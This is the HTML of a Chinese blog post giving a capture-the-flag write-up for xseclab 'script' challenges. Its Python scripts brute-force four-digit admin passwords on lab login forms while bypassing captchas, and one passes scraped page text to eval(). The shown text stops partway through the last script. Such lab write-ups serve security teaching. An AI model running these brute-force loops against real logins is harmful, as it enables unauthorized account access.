@@ -1,0 +1,1427 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/180x180.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/180x180.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+
+
+  <meta name="keywords" content="web,py脚本," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="key又又找不到了点击_到这里找key__后跳转到了没有key的页面，明显的跳转抓下来./search_key.php这个页面就好123456import requestsssion = requests.Session()url = &quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&quot;r =">
+<meta name="keywords" content="web,py脚本">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WP-hackinglab 脚本关（py脚本）">
+<meta property="og:url" content="http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-脚本关（py脚本）/index.html">
+<meta property="og:site_name" content="AbelChe&#39;s Blog">
+<meta property="og:description" content="key又又找不到了点击_到这里找key__后跳转到了没有key的页面，明显的跳转抓下来./search_key.php这个页面就好123456import requestsssion = requests.Session()url = &quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&quot;r =">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/seRPINp.png">
+<meta property="og:image" content="https://i.imgur.com/hfeLhcN.png">
+<meta property="og:image" content="https://i.imgur.com/oZpegAg.png">
+<meta property="og:image" content="https://i.imgur.com/Ca8FJdz.png">
+<meta property="og:image" content="https://i.imgur.com/xoJ8bo1.png">
+<meta property="og:image" content="https://i.imgur.com/kZEqUM7.png">
+<meta property="og:image" content="https://i.imgur.com/WCRcYrG.png">
+<meta property="og:image" content="https://i.imgur.com/j74pYVA.png">
+<meta property="og:updated_time" content="2019-02-18T12:52:41.959Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WP-hackinglab 脚本关（py脚本）">
+<meta name="twitter:description" content="key又又找不到了点击_到这里找key__后跳转到了没有key的页面，明显的跳转抓下来./search_key.php这个页面就好123456import requestsssion = requests.Session()url = &quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&quot;r =">
+<meta name="twitter:image" content="https://i.imgur.com/seRPINp.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"slideLeftIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeIn","sidebar":"slideDownIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-脚本关（py脚本）/"/>
+
+
+
+
+
+  <title>WP-hackinglab 脚本关（py脚本） | AbelChe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">AbelChe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Youth means limitless possibilities.</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-在线运行">
+          <a href="/runcode/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-code"></i> <br />
+            
+            在线运行
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://AbelChe.com/2019/02/18/Writeup/WP-hackinglab-脚本关（py脚本）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="AbelChe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AbelChe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">WP-hackinglab 脚本关（py脚本）</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-18T14:27:50+08:00">
+                2019-02-18
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-02-18T20:52:41+08:00">
+                2019-02-18
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
+                    <span itemprop="name">WriteUp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,294 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a><a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php" title="key又又找不到了" target="_blank" rel="noopener">key又又找不到了</a></h1><p>点击<code>_到这里找key__</code>后跳转到了没有key的页面，明显的跳转<br><img src="https://i.imgur.com/seRPINp.png" alt=""><br>抓下来<code>./search_key.php</code>这个页面就好<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">"http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"</span></span><br><span class="line">r = ssion.post(url)<span class="selector-class">.content</span><span class="selector-class">.decode</span>(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(r)</span></span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/hfeLhcN.png" alt=""></p>
+<h1 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a><a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php" title="快速口算" target="_blank" rel="noopener">快速口算</a></h1><p>明显的脚本题，直接抓下来然后计算式子就好<br>用到了正则<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line">r = ssion.post(url,headers=head)<span class="selector-class">.content</span><span class="selector-class">.decode</span>(<span class="string">'utf-8'</span>)</span><br><span class="line">findtext = re.findall(<span class="string">'&lt;br/&gt;\s+(.*?)='</span>, r)</span><br><span class="line">data = &#123;<span class="string">'v'</span>: eval(findtext[<span class="number">0</span>])&#125;</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(ssion.post(url, data=data, headers=head)</span></span><span class="selector-class">.content</span><span class="selector-class">.decode</span>(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/oZpegAg.png" alt=""></p>
+<h1 id="这个题目是空的"><a href="#这个题目是空的" class="headerlink" title="这个题目是空的"></a>这个题目是空的</h1><p>回答空即可，那就是<code>null</code></p>
+<h1 id="怎么就是不弹出key呢？"><a href="#怎么就是不弹出key呢？" class="headerlink" title="怎么就是不弹出key呢？"></a><a href="http://lab1.xseclab.com/xss3_5dcdde90bbe55087eb3514405972b1a6/index.php" title="怎么就是不弹出key呢？" target="_blank" rel="noopener">怎么就是不弹出key呢？</a></h1><p>源码如下：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">            </span><br><span class="line">            function alert(a)&#123;</span><br><span class="line">            	<span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            document.write=function()&#123;</span><br><span class="line">            	<span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            function prompt(a)&#123;</span><br><span class="line">            	<span class="keyword">return</span> false;</span><br><span class="line">            &#125;</span><br><span class="line">            var a=function ()&#123;</span><br><span class="line">               var b=function(p,a,c,k,e,r)&#123;e=function(c)&#123;<span class="keyword">return</span>(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;<span class="number">35</span>?String.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!''.<span class="built_in">replace</span>(/^/,String))&#123;while(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[function(e)&#123;<span class="keyword">return</span> r[e]&#125;];e=function()&#123;<span class="keyword">return</span>'\\w+'&#125;;c=<span class="number">1</span>&#125;;while(c--)<span class="keyword">if</span>(k[c])p=p.<span class="built_in">replace</span>(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);<span class="keyword">return</span> p&#125;('<span class="number">1</span>s(<span class="number">1</span>e(p,a,c,k,e,r)&#123;e=<span class="number">1</span>e(c)&#123;<span class="number">1</span>d(c&lt;a?\'\':e(<span class="number">1</span>p(c/a)))+((c=c%a)&gt;<span class="number">1</span>q?<span class="number">1</span>f<span class="number">.1</span>j(c+<span class="number">1</span>k):c<span class="number">.1</span>n(<span class="number">1</span>o))&#125;;<span class="number">1</span>g(!\'\'<span class="number">.1</span>h(/^/,<span class="number">1</span>f))&#123;<span class="number">1</span>i(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[<span class="number">1</span>e(e)&#123;<span class="number">1</span>d r[e]&#125;];e=<span class="number">1</span>e()&#123;<span class="number">1</span>d\'\\\\w+\'&#125;;c=<span class="number">1</span>&#125;;<span class="number">1</span>i(c--)<span class="number">1</span>g(k[c])p=p<span class="number">.1</span>h(<span class="number">1</span>l <span class="number">1</span>m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);<span class="number">1</span>d p&#125;(\'Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\'\\\':e(<span class="number">18</span>(c/a)))+((c=c%a)&gt;<span class="number">17</span>?T<span class="number">.16</span>(c+<span class="number">15</span>):c<span class="number">.12</span>(<span class="number">13</span>))&#125;;U(!\\\'\\\'.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\'\\\\\\\\w+\\\'&#125;;c=<span class="number">1</span>&#125;;W(c--)U(k[c])p=p.V(Z <span class="number">11</span>(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p&#125;(\\\'G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\'\\\\\\\'.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]|<span class="type">|e</span>(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'&#125;;c=<span class="number">1</span>&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p&#125;(\\\\\\\'t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o))&#123;l(c--)r[c]=k[c]|<span class="type">|c</span>;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'&#125;;c=<span class="number">1</span>&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p&#125;(\\\\\\\\\\\\\\\'<span class="number">1</span> <span class="number">3</span>=<span class="string">"6"</span>;<span class="number">1</span> <span class="number">4</span>=<span class="string">"7"</span>;<span class="number">1</span> <span class="number">5</span>=<span class="string">""</span>;<span class="number">8</span>(<span class="number">1</span> <span class="number">2</span>=<span class="number">0</span>;<span class="number">2</span>&lt;<span class="number">9</span>;<span class="number">2</span>++)&#123;<span class="number">5</span>+=<span class="number">3</span>+<span class="number">4</span>&#125;\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|<span class="type">u</span>|<span class="type">i</span>|<span class="type">b</span>|<span class="type">c</span>|<span class="type">d</span>|<span class="type">v</span>|<span class="type">x</span>|<span class="type">y</span>|<span class="type">j</span>\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|<span class="type">\\\\\\\\\\\\\\\'),0</span>,&#123;&#125;))\\\\\\\',H,H,\\\\\\\'|<span class="type">||||||||||||||A</span>|<span class="type">|B</span>|<span class="type">|M</span>|<span class="type">|D</span>|<span class="type">C</span>|<span class="type">E</span>|<span class="type">F</span>|<span class="type">|I</span>|<span class="type">|J</span>|<span class="type">G</span>|<span class="type">N</span>|<span class="type">O</span>|<span class="type">|P</span>|<span class="type">Q</span>|<span class="type">K</span>\\\\\\\'.K(\\\\\\\'|<span class="type">\\\\\\\'),0</span>,&#123;&#125;))\\\',X,X,\\\'|<span class="type">|||||||||||||||||||||||||||||||||||S</span>|<span class="type">R</span>|<span class="type">V</span>|<span class="type">W</span>|<span class="type">U</span>|<span class="type">T</span>|<span class="type">Y</span>|<span class="type">13</span>|<span class="type">Z</span>|<span class="type">11</span>|<span class="type">14</span>|<span class="type">12</span>|<span class="type">10</span>|<span class="type">19</span>|<span class="type">1a</span>|<span class="type">1b</span>|<span class="type">1c</span>\\\'<span class="number">.14</span>(\\\'|<span class="type">\\\'),0</span>,&#123;&#125;))\',<span class="number">1</span>t,<span class="number">1</span>u,\'|<span class="type">||||||||||||||||||||||||||||||||||||||||||||||||||||1e</span>|<span class="type">1d</span>|<span class="type">1f</span>|<span class="type">1g</span>|<span class="type">1h</span>|<span class="type">1i</span>|<span class="type">1v</span>|<span class="type">1s</span>|<span class="type">1l</span>|<span class="type">|1m</span>|<span class="type">1n</span>|<span class="type">1o</span>|<span class="type">1r</span>|<span class="type">1k</span>|<span class="type">1j</span>|<span class="type">1q</span>|<span class="type">1p</span>|<span class="type">1w</span>|<span class="type">1x</span>|<span class="type">1y</span>|<span class="type">1z</span>\'<span class="number">.1</span>r(\'|<span class="type">\'),0</span>,&#123;&#125;))',<span class="number">62</span>,<span class="number">98</span>,'|<span class="type">||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return</span>|<span class="type">function</span>|<span class="type">String</span>|<span class="type">if</span>|<span class="type">replace</span>|<span class="type">while</span>|<span class="type">fromCharCode</span>|<span class="type">29</span>|<span class="type">new</span>|<span class="type">RegExp</span>|<span class="type">toString</span>|<span class="type">36</span>|<span class="type">parseInt</span>|<span class="type">35</span>|<span class="type">split</span>|<span class="type">eval</span>|<span class="type">62</span>|<span class="type">75</span>|<span class="type">53</span>|<span class="type">var</span>|<span class="type">slakfj</span>|<span class="type">teslkjsdflk</span>|<span class="type">for</span>'.<span class="built_in">split</span>('|<span class="type">'),0</span>,&#123;&#125;);</span><br><span class="line">               var d=eval(b);</span><br><span class="line">               alert(<span class="string">"key is first 14 chars"</span>+d);</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">		&lt;a href=<span class="string">"javascript:a();"</span>&gt;<span class="keyword">_</span>点击之后怎么没反应呢？说好的弹窗呢？__&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
+<p>把这几个函数去掉本地上运行下即可<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alert</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prompt</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" title="逗比验证码第一期" target="_blank" rel="noopener">逗比验证码第一期</a></h1><p>脚本爆破密码(这里验证码有无都可)：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">"http://lab1.xseclab.com//vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php"</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=cd1c5f7554400cd3978f48d6e5c44c6a'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data = data, headers = head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'pwd error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">"[%d]\033[1;31mpwd: error %d\033[0m"</span> % (count, num))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'vcode error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'[%d]\033[1;31mvcode error pwd:%d\033[0m'</span> % (count, num))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'[%d]\033[1;32mpassword is: %d\033[0m'</span> % (count, num))</span><br><span class="line">        print(r)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/Ca8FJdz.png" alt=""></p>
+<h1 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a><a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php" title="逗比验证码第二期" target="_blank" rel="noopener">逗比验证码第二期</a></h1><p>一样的脚本爆破(这里不要填验证码):<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: num, <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">    r = ssion.post(url, data=data, headers=head).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\r\033[1;31m[-]I\'m trying!!! PROGESS:%d\033[0m'</span> % num, end=<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">u'error'</span> not <span class="keyword">in</span> r:</span><br><span class="line">        print(<span class="string">'\n\033[1;32m[+]Find password! %d\033[0m'</span> % num)</span><br><span class="line">        print(<span class="string">'\033[1;36m'</span>, r, <span class="string">'\033[0m'</span>)</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.imgur.com/xoJ8bo1.png" alt=""></p>
+<h1 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a><a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php" title="逗比的验证码第三期（SESSION）" target="_blank" rel="noopener">逗比的验证码第三期（SESSION）</a></h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ssion = requests.Session()</span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/login.php'</span></span><br><span class="line">head = &#123;<span class="string">'cookie'</span>: <span class="string">'PHPSESSID=e26ab2950d310b1bd6761d85d5ed8353'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(<span class="number">1000</span>, <span class="number">10000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span 